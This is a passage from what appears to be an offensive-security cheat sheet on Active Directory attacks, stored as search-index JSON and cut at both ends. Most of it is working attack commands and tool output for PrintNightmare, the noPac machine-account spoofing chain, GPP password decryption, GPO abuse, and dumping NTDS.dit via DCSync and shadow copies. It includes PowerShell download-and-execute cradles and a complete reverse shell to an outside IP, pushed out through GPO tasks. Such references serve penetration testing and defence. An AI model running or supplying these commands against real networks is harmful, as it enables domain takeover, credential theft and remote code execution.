\"AzkabanUnleashed123*\" \nInvoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n</code></pre></li> <li>Mimikatz v2.2.0-20210709+ <pre><code>## LPE\nmisc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll\n## RCE\nmisc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50\n</code></pre></li> <li>PrintNightmare - @outflanknl <pre><code>PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]\n</code></pre></li> </ul> <p>Debug informations</p> Error Message Debug 0x5 <code>rpc_s_access_denied</code> Permissions on the file in the SMB share 0x525 <code>ERROR_NO_SUCH_USER</code> The specified account does not exist. 0x180 unknown error code Share is not SMB2"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#samaccountname-spoofing","title":"samAccountName spoofing","text":"<p>During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.</p> <p>Requirements</p> <ul> <li>MachineAccountQuota &gt; 0</li> </ul> <p>Check for exploitation</p> <ol> <li>Check the MachineAccountQuota of the account   <pre><code>crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ\nStandIn.exe --object ms-DS-MachineAccountQuota=*\n</code></pre></li> <li>Check if the DC is vulnerable   <pre><code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac\n</code></pre></li> </ol> <p>Exploitation</p> <ol> <li>Create a computer account     <pre><code>impacket@linux&gt; addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'\npowermad@windows&gt; . .\\Powermad.ps1\npowermad@windows&gt; $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force\npowermad@windows&gt; New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose\nsharpmad@windows&gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword\n</code></pre></li> <li>Clear the controlled machine account <code>servicePrincipalName</code> attribute     <pre><code>impacket@linux&gt; addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController\npowershell@windows&gt; . .\\Powerview.ps1\npowershell@windows&gt; Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose\n</code></pre></li> <li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller's name without the trailing <code>$</code> <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1224\nimpacket@linux&gt; renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>Request a TGT for the controlled machine account     <pre><code>impacket@linux&gt; getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'\ncmd@windows&gt; Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap\n</code></pre></li> <li>Reset the controlled machine account sAMAccountName to its old value      <pre><code>impacket@linux&gt; renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before     <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1202\nimpacket@linux&gt; KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'\ncmd@windows&gt; Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT]\n</code></pre></li> <li>DCSync: <code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'</code></li> </ol> <p>Automated exploitation:</p> <ul> <li>cube0x0/noPac - Windows     <pre><code>noPac.exe scan -domain htb.local -user user -pass 'password123'\nnoPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt\nnoPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator\n</code></pre></li> <li>Ridter/noPac - Linux   <pre><code>python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump\n</code></pre></li> <li>WazeHell/sam-the-admin <pre><code>$ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n[*] Selected Target dc.caltech.white                                              \n[*] Total Domain Admins 11                                                        \n[*] will try to impersonat gaylene.dreddy                                         \n[*] Current ms-DS-MachineAccountQuota = 10                                        \n[*] Adding Computer Account \"SAMTHEADMIN-11$\"                                     \n[*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL                      \n[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.\n[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   \n[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          \n[*] Saving ticket in dc.ccache                                                    \n[*] Resting the machine account to SAMTHEADMIN-11$                                \n[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     \n[*] Using TGT from cache                                                          \n[*] Impersonating gaylene.dreddy                                                  \n[*]     Requesting S4U2self                                                       \n[*] Saving ticket in gaylene.dreddy.ccache                                        \n[!] Launching semi-interactive shell - Careful what you execute                   \nC:\\Windows\\system32&gt;whoami                                                        \nnt authority\\system \n</code></pre></li> <li>ly4k/Pachine <pre><code>usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]\n[-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]\n[domain/]username[:password]\n$ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'\n$ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'\n$ export KRB5CCNAME=$PWD/administrator@domain.local.ccache\n$ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'\n</code></pre></li> </ul> <p>Mitigations: * KB5007247 - Windows Server 2012 R2 * KB5008601 - Windows Server 2016 * KB5008602 - Windows Server 2019 * KB5007205 - Windows Server 2022 * KB5008102 * KB5008380</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#open-shares","title":"Open Shares","text":"<p>Some shares can be accessible without authentication, explore them to find some juicy files</p> <ul> <li> <p>ShawnDEvans/smbmap - a handy SMB enumeration tool <pre><code>smbmap -H 10.10.10.10                # null session\nsmbmap -H 10.10.10.10 -R             # recursive listing\nsmbmap -H 10.10.10.10 -u invaliduser # guest smb session\nsmbmap -H 10.10.10.10 -d \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\"\n</code></pre></p> </li> <li> <p>byt3bl33d3r/pth-smbclient from path-toolkit <pre><code>pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/Share\npth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$\nls  # list files\ncd  # move inside a folder\nget # download files\nput # replace a file\n</code></pre></p> </li> <li> <p>SecureAuthCorp/smbclient from Impacket <pre><code>smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\"\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share\nReplication     Disk      \nSYSVOL          Disk      Logon server share\nUsers           Disk\nuse Sharename # select a Sharename\ncd Folder     # move inside a folder\nls            # list files\n</code></pre></p> </li> <li> <p>smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers <pre><code>smbclient -U username //10.0.0.1/SYSVOL\nsmbclient //10.0.0.1/Share\n# Download a folder recursively\nsmb: \\&gt; mask \"\"\nsmb: \\&gt; recurse ON\nsmb: \\&gt; prompt OFF\nsmb: \\&gt; lcd '/path/to/go/'\nsmb: \\&gt; mget *\n</code></pre></p> </li> <li> <p>SnaffCon/Snaffler - a tool for pentesters to help find delicious candy <pre><code>snaffler.exe -s - snaffler.log\n# Snaffle all the computers in the domain\n./Snaffler.exe -d domain.local -c &lt;DC&gt; -s\n# Snaffle specific computers\n./Snaffler.exe -n computer1,computer2 -s\n\u200b\n# Snaffle a specific directory\n./Snaffler.exe -i C:\\ -s\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#scf-and-url-file-attack-against-writeable-share","title":"SCF and URL file attack against writeable share","text":"<p>Theses attacks can be automated with Farmer.exe and Crop.exe</p> <pre><code># Farmer to receive auth\nfarmer.exe &lt;port&gt; [seconds] [output]\nfarmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely\nfarmer.exe 8888 60 # one minute\n# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks\ncrop.exe &lt;output folder&gt; &lt;output filename&gt; &lt;WebDAV server&gt; &lt;LNK value&gt; [options]\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#scf-files","title":"SCF Files","text":"<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.10.10\\Share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>Using <code>crackmapexec</code>:</p> <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#url-files","title":"URL Files","text":"<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p> <pre><code>[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\10.10.10.10\\%USERNAME%.icon\nIconIndex=1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#windows-library-files","title":"Windows Library Files","text":"<p>Windows Library Files (.library-ms)</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/library&gt;\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#windows-search-connectors-files","title":"Windows Search Connectors Files","text":"<p>Windows Search Connectors (.searchConnector-ms)</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;searchConnectorDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/searchConnector&gt;\"&gt;\n&lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;\n&lt;description&gt;Microsoft Outlook&lt;/description&gt;\n&lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt;\n&lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt;\n&lt;iconReference&gt;\\\\\\\\workstation@8888\\\\folder.ico&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#passwords-in-sysvol-group-policy-preferences","title":"Passwords in SYSVOL &amp; Group Policy Preferences","text":"<p>Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.</p> <pre><code>findstr /S /I cpassword \\\\&lt;FQDN&gt;\\sysvol\\&lt;FQDN&gt;\\policies\\*.xml\n</code></pre> <p>Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption</p> <pre><code>echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\ne.g: echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\necho 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#automate-the-sysvol-and-passwords-research","title":"Automate the SYSVOL and passwords research","text":"<ul> <li> <p><code>Metasploit</code> modules to enumerate shares and credentials     <pre><code>scanner/smb/smb_enumshares\npost/windows/gather/enum_shares\npost/windows/gather/credentials/gpp\n</code></pre></p> </li> <li> <p>CrackMapExec modules     <pre><code>cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin\ncme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password\n</code></pre></p> </li> <li> <p>Get-GPPPassword <pre><code># with a NULL session\nGet-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n# with cleartext credentials\nGet-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n# pass-the-hash\nGet-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#mitigations_1","title":"Mitigations","text":"<ul> <li>Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li> <li>Delete existing GPP xml files in SYSVOL containing passwords.</li> <li>Don\u2019t put passwords in files that are accessible by all authenticated users.</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#exploit-group-policy-objects-gpo","title":"Exploit Group Policy Objects GPO","text":"<p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p> <p> GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p> <p>GPO are stored in the DC in <code>\\\\&lt;domain.dns&gt;\\SYSVOL\\&lt;domain.dns&gt;\\Policies\\&lt;GPOName&gt;\\</code>, inside two folders User and Machine. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\\Preferences\\ScheduledTasks</code>.</p> <p> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#find-vulnerable-gpo","title":"Find vulnerable GPO","text":"<p>Look a GPLink where you have the Write right.</p> <pre><code>Get-DomainObjectAcl -Identity \"SuperSecureGPO\" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\")}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-sharpgpoabuse","title":"Abuse GPO with SharpGPOAbuse","text":"<pre><code># Build and configure SharpGPOAbuse\n$ git clone https://github.com/FSecureLABS/SharpGPOAbuse\n$ Install-Package CommandLineParser -Version 1.9.3.15\n$ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll\n# Adding User Rights\n.\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\" --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n# Adding a Local Admin\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n# Configuring a User or Computer Logon Script\n.\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n# Configuring a Computer or User Immediate Task\n# /!\\ Intended to \"run once\" per GPO refresh, not run once per system\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n.\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\User' --TaskName \"EvilTask\" --Arguments  \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"cmd.exe\" --Force\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-powergpoabuse","title":"Abuse GPO with PowerGPOAbuse","text":"<ul> <li>https://github.com/rootSySdk/PowerGPOAbuse</li> </ul> <pre><code>PS&gt; . .\\PowerGPOAbuse.ps1\n# Adding a localadmin \nPS&gt; Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n# Assign a new right \nPS&gt; Add-UserRights -Rights \"SeLoadDriverPrivilege\",\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n# Adding a New Computer/User script \nPS&gt; Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'\n# Create an immediate task \nPS&gt; Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-pygpoabuse","title":"Abuse GPO with pyGPOAbuse","text":"<pre><code>$ git clone https://github.com/Hackndo/pyGPOAbuse\n# Add john user to local administrators group (Password: H4x00r123..)\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"\n# Reverse shell example\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ \n-powershell \\ \n-command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2&gt;&amp;1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '&gt; ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ \n-taskname \"Completely Legit Task\" \\\n-description \"Dis is legit, pliz no delete\" \\ \n-user\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-powerview","title":"Abuse GPO with PowerView","text":"<pre><code># Enumerate GPO\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO\nNew-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abuse-gpo-with-standin","title":"Abuse GPO with StandIn","text":"<pre><code># Add a local administrator\nStandIn.exe --gpo --filter Shards --localadmin user002\n# Set custom right to a user\nStandIn.exe --gpo --filter Shards --setuserrights user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\"\n# Execute a custom command\nStandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args \"with args\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dumping-ad-domain-credentials","title":"Dumping AD Domain Credentials","text":"<p>You will need the following files to extract the ntds :  - NTDS.dit file - SYSTEM hive (<code>C:\\Windows\\System32\\SYSTEM</code>)</p> <p>Usually you can find the ntds in two locations : <code>systemroot\\NTDS\\ntds.dit</code> and <code>systemroot\\System32\\ntds.dit</code>. - <code>systemroot\\NTDS\\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). - <code>systemroot\\System32\\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</p> <p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-ndtsutil","title":"Using ndtsutil","text":"<pre><code>C:\\&gt;ntdsutil\nntdsutil: activate instance ntds\nntdsutil: ifm\nifm: create full c:\\pentest\nifm: quit\nntdsutil: quit\n</code></pre> <p>or </p> <pre><code>ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-vshadow","title":"Using Vshadow","text":"<pre><code>vssadmin create shadow /for=C :\nCopy Shadow_Copy_Volume_Name\\windows\\ntds\\ntds.dit c:\\ntds.dit\n</code></pre> <p>You can also use the Nishang script, available at : https://github.com/samratashok/nishang</p> <pre><code>Import-Module .\\Copy-VSS.ps1\nCopy-VSS\nCopy-VSS -DestinationDir C:\\ShadowCopy\\\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-vssadmin","title":"Using vssadmin","text":"<pre><code>vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-diskshadow-a-windows-signed-binary","title":"Using DiskShadow (a Windows signed binary)","text":"<pre><code>diskshadow.txt contains :\nset context persistent nowriters\nadd volume c: alias someAlias\ncreate\nexpose %someAlias% z:\nexec \"cmd.exe\" /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit\ndelete shadows volume %someAlias%\nreset\nthen:\nNOTE - must be executed from C:\\Windows\\System32\ndiskshadow.exe /s  c:\\diskshadow.txt\ndir c:\\exfil\nreg.exe save hklm\\system c:\\exfil\\system.bak\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-esentutlexe","title":"Using esentutl.exe","text":"<p>Copy/extract a locked file such as the AD Database</p> <pre><code>esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#extract-hashes-from-ntdsdit","title":"Extract hashes from ntds.dit","text":"<p>then you need to use secretsdump to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p> <pre><code>secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL\n</code></pre> <p>secretsdump also works remotely</p> <pre><code>./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1\n</code></pre> <ul> <li><code>-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li> <li><code>-user-status</code>: Display whether or not the user is disabled.</li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#alternatives-modules","title":"Alternatives - modules","text":"<p>Metasploit modules</p> <pre><code>windows/gather/credentials/domain_hashdump\n</code></pre> <p>PowerSploit module</p> <pre><code>Invoke-NinjaCopy --path c:\\windows\\NTDS\\ntds.dit --verbose --localdestination c:\\ntds.dit\n</code></pre> <p>CrackMapExec module</p> <pre><code>cme smb 10.10.0.202 -u username -p password --ntds vss\ncme smb 10.10.0.202 -u username -p password --ntds drsuapi #default\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz-dcsync","title":"Using Mimikatz DCSync","text":"<p>Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. </p> <pre><code># DCSync only one user\nmimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt\n# DCSync all users of the domain\nmimikatz# lsadump::dcsync /domain:htb.local /all /csv\n</code></pre> <p> Read-Only Domain Controllers are not allowed to pull password data for users by default.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#using-mimikatz-sekurlsa","title":"Using Mimikatz sekurlsa","text":"<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.  Requires administrator access with debug or Local SYSTEM rights</p> <pre><code>sekurlsa::krbtgt\nlsadump::lsa /inject /name:krbtgt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#crack-ntlm-hashes-with-hashcat","title":"Crack NTLM hashes with hashcat","text":"<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p> <p>Recommended wordlists: - Rockyou.txt - Have I Been Pwned founds - Weakpass.com - Read More at Methodology and Resources/Hash Cracking.md</p> <pre><code># Basic wordlist\n# (-O) will Optimize for 32 characters or less passwords\n# (-w 4) will set the workload to \"Insane\" \n$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile 